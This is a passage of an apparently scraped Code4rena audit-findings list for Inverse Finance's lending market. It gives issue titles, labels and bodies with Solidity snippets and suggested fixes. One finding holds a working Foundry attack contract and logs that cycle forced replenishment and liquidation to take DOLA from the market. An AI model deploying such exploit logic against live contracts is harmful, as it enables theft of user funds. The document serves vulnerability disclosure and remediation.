https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L566   # Vulnerability details  ## Impact Users abels to invoke `forceReplenish()` when they are on liquidation position  ## Proof of Concept On `Market.sol` ==>  `forceReplenish()` On this line  ``` uint collateralValue = getCollateralValueInternal(user); ```  `getCollateralValueInternal(user)` only return the value of the collateral  ```     function getCollateralValueInternal(address user) internal returns (uint) {         IEscrow escrow = predictEscrow(user);         uint collateralBalance = escrow.balance();         return collateralBalance * oracle.getPrice(address(collateral), collateralFactorBps) / 1 ether;  ``` So if the user have 1.5 wETH at the price of  1 ETH = 1600 USD It will return `1.5 * 1600` and this value is the real value we can\u2019t just check it directly with the debt like this  ```  require(collateralValue >= debts[user], \"Exceeded collateral value\"); ``` This is no longer `over collateralized` protocol  The value needs to be multiplied by `collateralFactorBps / 10000` -  So depending on the value of `collateralFactorBps` and `liquidationFactorBps` the user could be in the liquidation position but he is able to invoke `forceReplenish()` to cover all their `dueTokensAccrued[user]` on `DBR.sol` and get more `DOLA` -  or it will lead a healthy debt to be in the liquidation position after invoking `forceReplenish()` -   ## Recommended Mitigation Steps Use `getCreditLimitInternal()` rather than `getCollateralValueInternal()`.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/413", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-28"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/411", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-36"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/406", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-27"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "`viewPrice` doesn't always report dampened price", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/404", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor confirmed", "selected for report", "M-11"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Oracle.sol#L91   # Vulnerability details  ## Impact Oracle's `viewPrice` function doesn't report a dampened price until `getPrice` is called and today's price is updated. This will impact the public read-only functions that call it: - [getCollateralValue](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L312); - [getCreditLimit](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L334) (calls `getCollateralValue`); - [getLiquidatableDebt](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L578) (calls `getCreditLimit`); - [getWithdrawalLimit](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L370).  These functions are used to get on-chain state and prepare values for write calls (e.g. calculate withdrawal amount before withdrawing or calculate a user's debt that can be liquidated before liquidating it). Thus, wrong values returned by these functions can cause withdrawal of a wrong amount or liquidation of a wrong debt or cause reverts. ## Proof of Concept ```solidity // src/test/Oracle.t.sol function test_viewPriceNoDampenedPrice_AUDIT() public {     uint collateralFactor = market.collateralFactorBps();     uint day = block.timestamp / 1 days;     uint feedPrice = ethFeed.latestAnswer();      //1600e18 price saved as daily low     oracle.getPrice(address(WETH), collateralFactor);     assertEq(oracle.dailyLows(address(WETH), day), feedPrice);      vm.warp(block.timestamp + 1 days);     uint newPrice = 1200e18;     ethFeed.changeAnswer(newPrice);     //1200e18 price saved as daily low     oracle.getPrice(address(WETH), collateralFactor);     assertEq(oracle.dailyLows(address(WETH), ++day), newPrice);      vm.warp(block.timestamp + 1 days);     newPrice = 3000e18;     ethFeed.changeAnswer(newPrice);      //1200e18 should be twoDayLow, 3000e18 is current price. We should receive dampened price here.     // Notice that viewPrice is called before getPrice.     uint viewPrice = oracle.viewPrice(address(WETH), collateralFactor);     uint price = oracle.getPrice(address(WETH), collateralFactor);     assertEq(oracle.dailyLows(address(WETH), ++day), newPrice);      assertEq(price, 1200e18 * 10_000 / collateralFactor);      // View price wasn't dampened.     assertEq(viewPrice, 3000e18); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps Consider this change: ```diff --- a/src/Oracle.sol +++ b/src/Oracle.sol @@ -89,6 +89,9 @@ contract Oracle {              uint day = block.timestamp / 1 days;              // get today's low              uint todaysLow = dailyLows[token][day]; +            if(todaysLow == 0 || normalizedPrice < todaysLow) { +                todaysLow = normalizedPrice; +            }              // get yesterday's low              uint yesterdaysLow = dailyLows[token][day - 1];              // calculate new borrowing power based on collateral factor ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/398", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-26"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Liquidation should make a borrower _healthier_", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/395", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "sponsor confirmed", "selected for report", "M-10"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L559 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L591   # Vulnerability details  ## Impact  For a lending pool, borrower's debt healthness can be decided by the health factor, i.e. the collateral value divided by debt. ($C/D$)  The less the health factor is, the borrower's collateral is more risky of being liquidated.  Liquidation is supposed to make the borrower healthier (by paying debts and claiming some collateral), or else continuous liquidations can follow up and this can lead to a so-called [liquidation crisis](https://medium.com/coinmonks/what-is-liquidation-in-defi-lending-and-borrowing-platforms-3326e0ba8d0).  In a normal lending protocol, borrower's debt is limited by collateral factor in any case.  For this protocol, users can force replenishment for the addresses in deficit and the replenishment increases the borrower's debt.  And in the current implementation the replenishment is limited so that the new debt is not over than the collateral value.  As we will see below, this limitation is not enough and if the borrower's debt is over some threshold (still less than collateral value), liquidation makes the borrower debt \"unhealthier\".  And repeating liquidation can lead to various problems and we will even show an example that the attacker can take the DOLA out of the market.  ## Proof of Concept  ### Terminology  $C_f$ - collateralFactorBps / 10000  $L_i$ - liquidationIncentiveBps / 10000  $L_{fe}$ - liquidationFeeBps / 10000  $L_{fa}$ - liquidationFactorBps / 10000  $D$ - user's debt recognized by the market  $C$ - user's collateral held by the escrow  $P$ - collateral price in DOLA, 1 collateral = $P$ DOLAs. For simplicity, assumed to be a constant.  Constraints on the parameters in the current implementation  All parameters are in range $(0,1)$ and $L_{fe}+L_i<1$.  #### Condition for liquidation  1. Debt is over the credit limit        $D>C_f  C  P$  2. Liquidation amount is limited by liquidation factor times user debt.        $x\\le L_{fa}D$  #### Study  We will explore a condition when the liquidation will decrease the health factor after liquidation of $x$.  After liquidation, borrower's new debt is $D-x$ and the collateral value is $CP-x(1+L_i+L_{fe})$ (in DOLA) due to the incentives and fee.  Let us see when the new health factor can be less than the previous health factor.  $\\frac {CP-x(1+L_i+L_{fe})}{D-x} < \\frac {CP}{D}$  $CP<D(1+L_i+L_{fe})$  $D>\\frac{CP}{1+L_i+L_{fe}}$  So if the borrower's debt is over some value depending on the collateral value and liquidation incentive and fee, liquidation of any amount will make the account unhealthier.  Note that the right hand of the above inequality is still less than the collateral value and it means one can intentionally increase an account debt via replenishment so that it is over the threshold.  Furthermore, we notice that it is even possible that the debt can be greater than the above threshold without any replenishment if $C_f>\\frac {1}{1+L_i+L_{fe}}$. The example attacker is written assuming this case but considering the possible side effects of replenishment, we suggest limiting the liquidation function so that it can not decrease the health factor.  #### Example  For $C_f=0.85, L_{fe}=0.01, L_{fa}=0.5, L_i=0.18$, an attacker can take DOLA out of protocol as below. We believe that these parameters are quite realistic. For these parameters, if an attacker borrows as much as it can, then the debt becomes greater than the threshold already without any replenishment.  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\"; import \"../DBR.sol\"; import \"../Market.sol\"; import \"./FiRMTest.sol\";  contract Attack_2 is FiRMTest {     address operator;      function setUp() public {         vm.label(gov, \"operator\");         operator = gov;          collateralFactorBps = 8500;         liquidationBonusBps = 1800;         replenishmentPriceBps = 50000;          initialize(replenishmentPriceBps, collateralFactorBps, replenishmentIncentiveBps, liquidationBonusBps, callOnDepositCallback);          vm.startPrank(gov);         market.setLiquidationFeeBps(100);         market.setLiquidationFactorBps(5000);         vm.stopPrank();          vm.startPrank(chair);         fed.expansion(IMarket(address(market)), 1_000_000e18);         vm.stopPrank();     }       function getMaxForceReplenishable(address user) public view returns (uint) {         // once the debt is over the collateral value, getLiquidatableDebt might return more than what are actually in the collateral         uint256 currentDeficit = dbr.deficitOf(user);         uint256 limitByCollateralValue = 0;         if(market.getCollateralValue(user) > market.debts(user))         {             limitByCollateralValue = (market.getCollateralValue(user) - market.debts(user)) * 10000 / dbr.replenishmentPriceBps();         }          return currentDeficit <= limitByCollateralValue ? currentDeficit : limitByCollateralValue;     }      function getMaxLiquidatable(address user) public view returns (uint) {         // once the debt is over the collateral value, getLiquidatableDebt might return more than what are actually in the collateral          uint256 limitByLiquidationFactor = market.getLiquidatableDebt(user);         uint256 limitByLiquidationReward = market.getCollateralValue(user) * 10000 / (10000 + market.liquidationFeeBps() + market.liquidationIncentiveBps());          return limitByLiquidationFactor >= limitByLiquidationReward ? limitByLiquidationReward : limitByLiquidationFactor;     }      function userTotalValue(address user) public view returns (uint256) {         uint P = ethFeed.latestAnswer() / 1e18;         uint256 totalValue = DOLA.balanceOf(user) / P + WETH.balanceOf(user);         // if the collateral value is greater than the debt, the total value includes the difference because user can repay debt and claim the collateral back         if(market.getCollateralValue(user) > market.debts(user))             totalValue += (market.getCollateralValue(user) - market.debts(user))/P;         return totalValue;     }      function testAttack_2() public {         uint P = ethFeed.latestAnswer() / 1e18; // assume the price stays the same          gibWeth(user, wethTestAmount); // 10^18, 1 eth for collateral         gibDOLA(user, wethTestAmount * P); // 10^18, 1 eth in DOLA for liquidation          // block 1         vm.startPrank(user);         deposit(wethTestAmount); // collateral          uint borrowAmount = market.getCreditLimit(user); // borrow as much as it can         market.borrow(borrowAmount);          emit log_named_decimal_uint(\"Total value before exploit\", userTotalValue(user), 18);         emit log_named_uint(\"B\", market.debts(user));         emit log_named_uint(\"D\", market.debts(user));         emit log_named_uint(\"C\", market.getCollateralValue(user));         emit log_named_decimal_uint(\"H\", market.getCollateralValue(user) * 1e18 / market.debts(user), 18);          // start liquidation         uint cycle = 1;         while(cycle < 100)         {             emit log_named_uint(\"Cycle\", cycle);             uint256 liquidatable = getMaxLiquidatable(user);             if(liquidatable > 0)             {                 emit log(\"Liquidation\");                 emit log_named_uint(\"L\", liquidatable);                 market.liquidate(user, liquidatable); // liquidate as much as it can             }             else {                 emit log(\"Wait a block and force replenishment\");                 vm.warp(block.timestamp + 1);                 uint256 replenishable = getMaxForceReplenishable(user);                 emit log_named_uint(\"R\", replenishable); // force replenish as much as possible, this will incur some loss but will make the address liquidatable                 market.forceReplenish(user, replenishable);             }               emit log_named_uint(\"D\", market.debts(user));             emit log_named_uint(\"C\", market.getCollateralValue(user));             emit log_named_decimal_uint(\"H\", market.getCollateralValue(user) * 1e18 / market.debts(user), 18);              ++ cycle;              uint256 totalValue = userTotalValue(user);             emit log_named_decimal_uint(\"Total value the user owns\",  totalValue, 18);             if(totalValue > wethTestAmount * 2)                 break; // no need to continue, the attacker already took profit from the market         }     } }  ```  The test results are as below. We can see that the health factor is decreasing for every liquidation and this ultimately makes the debt greater than collateral value. Then the attacker's total value increases for every liquidation and finally it gets more value than the initial status.  ``` > forge test -vv --match-test testAttack_2   Total value before exploit: 2.000000000000000000   B: 1360000000000000000000   D: 1360000000000000000000   C: 1600000000000000000000   H: 1.176470588235294117   Cycle: 1   Wait a block and force replenishment   R: 43125317097919   D: 1360000215626585489595   C: 1600000000000000000000   H: 1.176470401707135551   Total value the user owns: 1.999999871971714865   Cycle: 2   Liquidation   L: 680000107813292744797   D: 680000107813292744798   C: 790799871702181636800   H: 1.162940803414271107   Total value the user owns: 1.995749871297881786   Cycle: 3   Liquidation   L: 340000053906646372399   D: 340000053906646372399   C: 386199807553272457600   H: 1.135881606828542227   Total value the user owns: 1.993624870960965247   Cycle: 4   Liquidation   L: 170000026953323186199   D: 170000026953323186200   C: 183899775478817868800   H: 1.081763213657084471   Total value the user owns: 1.992562370792506977   Cycle: 5   Liquidation   L: 85000013476661593100   D: 85000013476661593100   C: 82749759441590576000   H: 0.973526427314168978   Total value the user owns: 1.993437529480197230   Cycle: 6   Liquidation   L: 42500006738330796550   D: 42500006738330796550   C: 32174751422976931200   H: 0.757052854628338029   Total value the user owns: 1.998218780238259443   Cycle: 7   Liquidation   L: 21250003369165398275   D: 21250003369165398275   C: 6887247413670110400   H: 0.324105709256676206   Total value the user owns: 2.000609405617290549 ```  ## Tools Used  Foundry  ## Recommended Mitigation Steps  Make sure the liquidation does not decrease the health index in the function `liquidate`. With this mitigation, we also suggest limiting the debt increase in the function `forceReplenish` so that the new debt after replenish will not be over the threshold.  ```solidity function liquidate(address user, uint repaidDebt) public {     require(repaidDebt > 0, \"Must repay positive debt\");     uint debt = debts[user];     require(getCreditLimitInternal(user) < debt, \"User debt is healthy\");     require(repaidDebt <= debt * liquidationFactorBps / 10000, \"Exceeded liquidation factor\");      // ****************************************     uint beforeHealthFactor = getCollateralValue(user) * 1e18 / debt; // @audit remember the health factor before liquidation     // ****************************************      uint price = oracle.getPrice(address(collateral), collateralFactorBps); // collateral price in dola     uint liquidatorReward = repaidDebt * 1 ether / price; // collateral amount     liquidatorReward += liquidatorReward * liquidationIncentiveBps / 10000;     debts[user] -= repaidDebt;     totalDebt -= repaidDebt;      dbr.onRepay(user, repaidDebt);     dola.transferFrom(msg.sender, address(this), repaidDebt);     IEscrow escrow = predictEscrow(user);     escrow.pay(msg.sender, liquidatorReward);     if(liquidationFeeBps > 0) {         uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;         if(escrow.balance() >= liquidationFee) {             escrow.pay(gov, liquidationFee);         }     }      // ****************************************     uint afterHealthFactor = getCollateralValue(user) * 1e18 / debts[user]; // @audit health factor after liquidation     require(afterHealthFactor >= beforeHealthFactor, \"Liquidation should not decrease the health factor of the address\"); // @audit new check     // ****************************************      emit Liquidate(user, msg.sender, repaidDebt, liquidatorReward); }  function forceReplenish(address user, uint amount) public {     uint deficit = dbr.deficitOf(user);     require(deficit > 0, \"No DBR deficit\");     require(deficit >= amount, \"Amount > deficit\");     uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;     uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;     debts[user] += replenishmentCost;     uint collateralValue = getCollateralValueInternal(user);      // ****************************************     // require(collateralValue >= debts[user], \"Exceeded collateral value\");     require(collateralValue >= debts[user] * (1 + liquidationIncentiveBps / 10000 + liquidationFeeBps / 10000), \"Debt exceeds safe collateral limit\"); // @audit more strict limit     // ****************************************      totalDebt += replenishmentCost;     dbr.onForceReplenish(user, amount);     dola.transfer(msg.sender, replenisherReward);     emit ForceReplenish(user, msg.sender, amount, replenishmentCost, replenisherReward); } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/392", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-25"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/380", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-35"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Avoidable misconfiguration could lead to INVEscrow contract not minting xINV tokens", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/379", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "sponsor acknowledged", "selected for report", "M-09"], "target": "2022-10-inverse-findings", "body": "Avoidable misconfiguration could lead to INVEscrow contract not minting xINV tokens"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/377", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-24"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/369", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-34"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/368", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "G-33"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/365", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-23"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/355", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-32"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/345", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-22"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/344", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-31"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/326", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-30"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/322", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-29"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/321", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-21"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/313", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-28"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/312", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-27"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/305", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-20"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Protocol withdrawals of collateral can be unexpectedly locked if governance sets the `collateralFactorBps` to 0.", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/301", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor disputed", "selected for report", "M-08"], "target": "2022-10-inverse-findings", "body": "Protocol withdrawals of collateral can be unexpectedly locked if governance sets the `collateralFactorBps` to 0."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/298", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-19"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/295", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-18"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/282", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-26"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/281", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-17"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Oracle's two-day feature can be gamed", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/278", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor acknowledged", "selected for report", "M-07"], "target": "2022-10-inverse-findings", "body": "Oracle's two-day feature can be gamed"}, {"title": "User can free from liquidation fee if its escrow balance is less than the calculated liquidation fee.", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/275", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-06"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L605-L610   # Vulnerability details  ## Impact User can free from liquidation fee if its escrow balance less than the calculated liquidation fee.  ## Proof of Concept If the `liquidationFeeBps` is enabled, the `gov` should receive the liquidation fee. But if user's escrow balance is less than the calculated liquidation fee, `gov` got nothing. https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L605-L610  ```solidity         if(liquidationFeeBps > 0) {             uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;             if(escrow.balance() >= liquidationFee) {                 escrow.pay(gov, liquidationFee);             }         } ```   ## Tools Used manual review  ## Recommended Mitigation Steps User should pay all the remaining escrow balance if the calculated liquidation fee is greater than its escrow balance.  ```solidity         if(liquidationFeeBps > 0) {             uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;             if(escrow.balance() >= liquidationFee) {                 escrow.pay(gov, liquidationFee);             } else {                 escrow.pay(gov, escrow.balance());             }         } ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/259", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-25"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/257", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-16"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/256", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-24"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "`repay` function can be DOSed", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/252", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-05"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L531   # Vulnerability details  ## Impact In `repay()` users can repay their debt. ``` function repay(address user, uint amount) public {         uint debt = debts[user];         require(debt >= amount, \"Insufficient debt\");         debts[user] -= amount;         totalDebt -= amount;         dbr.onRepay(user, amount);         dola.transferFrom(msg.sender, address(this), amount);         emit Repay(user, msg.sender, amount);     } ```  There is a `require` condition, that checks if the amount provided, is greater than the debt of the user. If it is, then the function reverts. This is where the vulnerability arises.  `repay` function can be frontrun by an attacker. Say an attacker pay a small amount of debt for the victim user, by frontrunning his repay transaction. Now when the victim's transaction gets executed, the `require` condition will fail, as the amount of debt is less than the amount of DOLA provided. Hence the attacker can repeat the process to DOS the victim from calling the repay function.   ## Proof of Concept  1. Victim calls repay() function to pay his debt of 500 DOLA , by providing the amount as 500 2. Now attacker saw this transaction on mempool 3. Attacker frontruns the transaction, by calling repay() with amount provided as 1 DOLA 4. Attacker's transaction get's executed first due to frontrunning, which reduces the debt of the victim user to 499 DOLA 5. Now when the victim's transaction get's executed, the debt of victim has reduced to 499 DOLA, and the amount to repay provided was 500 DOLA. Now as debt is less than the amount provided, so the require function will fail, and the victim's transaction will revert. This will prevent the victim from calling repay function  Hence an attacker can DOS the repay function for the victim user  ## Tools Used Manual review  ## Recommended Mitigation Steps Implement DOS protection"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/226", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-23"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/214", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-15"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/213", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-22"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/212", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-14"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "ERC777 reentrancy when withdrawing can be used to withdraw all collateral", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/206", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "satisfactory", "sponsor acknowledged", "selected for report", "M-04"], "target": "2022-10-inverse-findings", "body": "ERC777 reentrancy when withdrawing can be used to withdraw all collateral"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/194", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-21"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/186", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-13"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/184", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-12"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/169", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-20"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/161", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-11"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "User can borrow DOLA indefinitely without settling DBR deficit by keeping their debt close to the allowed maximum", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/155", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor confirmed", "edited-by-warden", "selected for report", "M-03"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L567   # Vulnerability details  ## Impact  A user can borrow DOLA interest-free. This requires the user to precisely manage their collateral. This issue might become especially troublesome if a Market is opened with some stablecoin as the collateral (because price fluctuations would become negligible and carefully managing collateral level would be easy).  This issue is harder to exploit (but not impossible) if `gov` takes responsibility for forcing replenishment, since `gov` has a stronger economic incentive than third parties.  ## Proof of Concept  If my calculations are correct, with the current gas prices it costs about \\$5 to call `Market.forceReplenish(...)`. Thus  there is no economic incentive to do so as long as a debtor's DBR deficit is worth less than \\$5/`replenishmentIncentive` so probably around \\$100.  This is because replenishing cannot push a user's debt under the water (https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L567) and a user can repay their debt without having settled the DBR deficit (https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L531).  So, assuming the current prices, a user can: 1. Deposit some collateral 2. Borrow close to the maximum allowed amount of DOLA 3. Keep withdrawing or depositing collateral so that the collateral surplus does not exceed $100 (assuming current gas prices) 4. `repay()` their debt at any time in the future. 5. Withdraw all the collateral.  All this is possible with arbitrarily large DBR deficit because due to small collateral surplus at no point was it economical for a third party to `forceReplenish()` the user. If `gov` takes responsibility for `forceReplenish()`ing, the above procedure is still viable although the user has to maintain the collateral surplus at no more than around $5.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Allow replenishing to push the debt under the water and disallow repaying the debt with an outstanding DBR deficit. E.g.: ``` diff --git a/src/Market.sol b/src/Market.sol index 9585b85..d69b599 100644 --- a/src/Market.sol +++ b/src/Market.sol @@ -531,6 +531,7 @@ contract Market {      function repay(address user, uint amount) public {          uint debt = debts[user];          require(debt >= amount, \"Insufficient debt\"); +        require(dbr.deficitOf(user) == 0, \"DBR Deficit\");          debts[user] -= amount;          totalDebt -= amount;          dbr.onRepay(user, amount); @@ -563,8 +564,6 @@ contract Market {          uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;          uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;          debts[user] += replenishmentCost; -        uint collateralValue = getCollateralValueInternal(user); -        require(collateralValue >= debts[user], \"Exceeded collateral value\");          totalDebt += replenishmentCost;          dbr.onForceReplenish(user, amount);          dola.transfer(msg.sender, replenisherReward); ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/154", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-19"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/130", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-18"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/126", "labels": ["bug", "QA (Quality Assurance)", 